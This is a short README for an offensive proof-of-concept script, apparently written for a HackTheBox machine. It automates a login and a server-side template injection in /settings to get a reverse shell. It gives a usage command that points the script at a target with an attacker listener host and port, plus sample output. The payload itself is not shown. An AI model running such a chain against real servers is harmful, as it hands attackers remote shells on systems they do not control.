# 🐍 SSTI → RCE Exploit PoC

**Author:** Uday  
**HackTheBox:** ExtremeUday2  
**X (Twitter):** [@udaypro2008](https://x.com/udaypro2008)

---

## 📌 Description
This PoC demonstrates **Server-Side Template Injection (SSTI)** leading to **Remote Code Execution (RCE)**.  
The script automates the following steps:
1. 🏷️ Fetch CSRF Token
2. 🔑 Login with given credentials
3. 🍪 Capture session cookies
4. 💉 Inject SSTI payload in `/settings`
5. 📞 Get a reverse shell on attacker machine

---

## ⚠️ Disclaimer
> This code is for **educational purposes only**.  
> Do NOT use it on live systems without permission.  

---

## 🚀 Usage

```bash
python3 ssti_rce.py -url http://TARGET -lhost $ip -lport $port --username admin --password password
```
---

## 🎯 Example Output
- [+] CSRF Token Found: abc123
- [+] Login Successful
- [+] Sending Payload...
- [+] Payload Sent Successfully! Check your listener.
